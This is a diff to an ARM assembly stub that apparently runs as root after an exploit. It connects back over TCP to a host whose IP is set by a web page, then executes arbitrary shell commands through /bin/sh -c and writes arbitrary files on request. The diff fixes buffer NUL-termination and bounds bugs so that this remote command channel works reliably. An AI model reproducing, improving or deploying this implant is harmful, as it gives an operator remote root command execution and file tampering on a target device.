@@ -65,7 +65,7 @@ _start:
     cmp     r0, #0
     blt     fail
 
-    @ open("/dev/video40", O_RDWR); retry while another opener holds it
+    @ open("/dev/video30", O_RDWR); retry while another opener holds it
     mov     r9, #120          @ ~120 s of 1 s sleeps
 open_retry:
     movw    r0, #OFF_path
@@ -287,10 +287,15 @@ fork_pause:
 @ op 7 RUN: c = length of "-c\0<command>"; fork, child dup2+execve
 @ ("/bin/sh", ["/bin/sh","-c",cmd], NULL).  Parent keeps the socket alive
 @ and returns the child pid.
+@ v39: the buffer is NUL-TERMINATED here.  The client sends "-c\0" + command
+@ with no trailing NUL, so a second op 7 with a shorter command used to execute
+@ the tails of the previous one (the .space is not re-zeroed between ops).
 op_run:
-    movw    r2, #512          @ cmdbuf: "-c\0" + command, no more
+    movw    r2, #511          @ cmdbuf 512: "-c\0" + command + NUL
     cmp     r11, r2
     bhi     op_bad_die        @ the payload follows; never overflow then parse it
+    cmp     r11, #3           @ at least "-c\0"
+    blo     op_bad_die
     mov     r0, r6
     movw    r1, #OFF_cmdbuf
     add     r1, r12, r1
@@ -298,6 +303,10 @@ op_run:
     bl      recv_full
     cmp     r0, #0
     bne     op_err
+    movw    r1, #OFF_cmdbuf
+    add     r1, r12, r1
+    mov     r2, #0
+    strb    r2, [r1, r11]     @ NUL after the received bytes
     mov     r7, #2            @ fork
     svc     #0
     cmp     r0, #0
@@ -339,9 +348,11 @@ run_child:
 @ op 8 FILE: a=flags (0 trunc, 1 append), b=pathlen, c=datalen.
 @ Reads path then data from the socket and writes it as the (root) stub.
 op_file:
-    movw    r2, #256          @ pathbuf
+    movw    r2, #255          @ pathbuf 256: the path plus its NUL
     cmp     r10, r2
     bhi     op_bad_die
+    cmp     r10, #1
+    blo     op_bad_die
     movw    r2, #4096         @ databuf
     cmp     r11, r2
     bhi     op_bad_die
@@ -352,6 +363,10 @@ op_file:
     bl      recv_full
     cmp     r0, #0
     bne     op_err
+    movw    r1, #OFF_pathbuf
+    add     r1, r12, r1
+    mov     r2, #0
+    strb    r2, [r1, r10]     @ NUL-terminate: open() needs a C string
     mov     r0, r6
     movw    r1, #OFF_databuf
     add     r1, r12, r1
@@ -507,7 +522,10 @@ send_status:
 tag:        .ascii "PHYSRPC1\0"
 forktag:    .ascii "PHYRFORK\0"
 sa:         .word 0x50000002      @ AF_INET, port 80 (big endian)
-            .word 0xd6b2a8c0      @ <pc-ip>
+            .word 0x010200c0      @ 192.0.2.1 (TEST-NET-1): the page rewrites this
+                                  @ from location.hostname before the copy; the
+                                  @ placeholder keeps a private LAN IP out of the
+                                  @ repo (and out of a release)
             .word 0
             .word 0
 path:       .ascii "/dev/video30\0"
